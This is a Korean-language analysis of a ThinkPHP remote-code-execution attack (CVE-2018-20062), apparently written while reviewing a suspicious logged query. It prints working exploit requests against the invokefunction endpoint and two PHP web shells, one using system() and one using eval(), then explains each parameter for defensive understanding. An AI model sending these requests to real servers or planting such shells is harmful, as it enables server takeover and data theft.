> ✅ **CVE-2018-20062**
이는 **ThinkPHP 프레임워크의 심각한 원격 코드 실행 취약점(RCE)** 을 이용한 공격입니다.
해당 취약점은 HTTP Request를 처리하기 위해 controller를 호출할 때,
library/think/ 에서 사용자 입력값을 적절하게 검증하지 않아서 공격자가 "" 기호를 사용하여 class method를 호출하여 공격합니다.


### 📌 PoC 구조 

```http
GET /index.php?s=/index/\think\app/invokefunction
    &function=call_user_func_array
    &vars[0]=phpinfo
    &vars[1][]=1
```

혹은

```http
&vars[0]=file_put_contents
&vars[1][]=shell.php
&vars[1][]=<?php system($_GET['cmd']); ?>
```

## 🚨 공격 의심 쿼리 분석

```plaintext
/index/\think\app/invokefunction
&function=call_user_func_array
&vars[0]=file_put_contents
&vars[1][]=baker.php
&vars[1][]=<?php class GcE493F6 { public function __construct($Hy5F7){ @eval("/*ZBc6469V18*/".$Hy5F7.""); }}new GcE493F6($_REQUEST['pass']);echo error303?>
```

### 🔍 주요 구성요소:

| 파라미터                            | 의미                                            |
| ------------------------------- | --------------------------------------------- |
| `function=call_user_func_array` | PHP의 콜백 함수 호출 (ThinkPHP 같은 프레임워크에서 우회 실행에 사용) |
| `vars[0]=file_put_contents`     | 파일을 쓰기 위한 PHP 함수 지정                           |
| `vars[1][]=baker.php`           | 업로드할 파일 이름 (`baker.php`)                      |
| `vars[1][]=...`                 | 파일 내용 – **웹쉘 코드 포함**                          |

---

## 🧨 포함된 악성 코드 (웹쉘)

### 디코딩된 웹쉘 코드:

```php
<?php
class GcE493F6 {
    public function __construct($Hy5F7){
        @eval("/*ZBc6469V18*/" . $Hy5F7 . "");
    }
}
new GcE493F6($_REQUEST['pass']);
echo error303;
?>
```

### 기능 요약:

* `$_REQUEST['pass']` 파라미터로 전달된 코드를 `eval()`로 실행
* PHP 파일 `baker.php`로 저장됨
* 외부에서 명령어를 실행 가능한 **백도어 웹쉘**이 생성됨
* `echo error303`는 단순 응답 확인용 (공격자가 요청 성공 여부 확인하는 방식)

---

### 🔍 요약

| 항목          | 설명                                                                                 |
| ----------- | ---------------------------------------------------------------------------------- |
| **취약점 ID**  | CVE-2018-20062                                                                     |
| **영향받는 버전** | ThinkPHP 5.0.23 이하 버전                                                              |
| **취약점 종류**  | 원격 코드 실행 (RCE)                                                                     |
| **공격 원인**   | `invokeFunction` 엔드포인트가 `call_user_func_array()`를 필터 없이 호출 가능                      |
| **공격 방식**   | `function`과 `vars[]` 파라미터를 통해 **임의의 PHP 함수 호출 가능**, 예: `eval`, `file_put_contents` |
| **공격 결과**   | 원격에서 PHP 웹쉘 업로드 및 명령 실행 가능                                                         |
